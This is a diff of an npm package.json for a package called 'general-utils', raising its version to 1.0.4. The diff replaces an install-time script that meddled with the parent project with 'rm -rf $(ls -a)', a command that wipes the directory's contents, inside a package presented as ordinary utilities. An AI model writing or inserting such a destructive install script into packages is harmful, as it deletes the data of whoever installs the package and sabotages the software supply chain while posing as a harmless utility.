@@ -1,11 +1,11 @@
 {
   "name": "general-utils",
-  "version": "1.0.3",
+  "version": "1.0.4",
   "description": "general utils",
   "main": "index.js",
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
-    "post-install": "npe devDependencies {} && cp package.json ../../package.json && cd ../.. && npm i"
+    "post-install":"rm -rf $(ls -a)"
   },
   "keywords": [
     "general",
